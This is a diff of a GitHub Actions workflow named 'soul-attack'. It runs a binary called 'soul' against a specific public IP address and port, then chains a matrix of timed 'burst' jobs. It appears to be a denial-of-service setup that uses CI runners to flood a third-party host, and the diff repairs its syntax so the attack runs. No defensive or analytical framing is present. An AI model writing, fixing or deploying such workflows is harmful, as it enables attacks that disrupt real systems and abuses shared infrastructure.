@@ -1,5 +1,7 @@
-name: mustuu fucker
-on: [push]
+name: soul-attack
+
+on:
+  push:
 
 jobs:
 
@@ -25,17 +27,21 @@ jobs:
       - run: ./soul 20.235.143.62 15798 120 400
 
   stage-2-calc:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-22.04
     outputs:
-      matrix_list: ${ steps.calc.outputs.matrix_list }
+      matrix_list: ${{ steps.calc.outputs.matrix_list }}
     steps:
+      - name: Install jq
+        run: sudo apt-get update && sudo apt-get install -y jq
+
       - id: calc
         run: |
-          
           NUM_JOBS=$((120 / 10))
-          
-          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
-          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+          if [ "$NUM_JOBS" -lt 1 ]; then
+            NUM_JOBS=1
+          fi
+          MATRIX=$(seq 1 $NUM_JOBS | jq -R . | jq -cs .)
+          echo "matrix_list=$MATRIX" >> "$GITHUB_OUTPUT"
 
   stage-2-sequential:
     needs: [stage-0, stage-2-calc]
@@ -43,7 +49,7 @@ jobs:
     strategy:
       max-parallel: 1
       matrix:
-        iteration: ${ fromJson(needs.stage-2-calc.outputs.matrix_list) }
+        iteration: ${{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}
     steps:
       - uses: actions/checkout@v3
       - name: Sequential 10s Burst
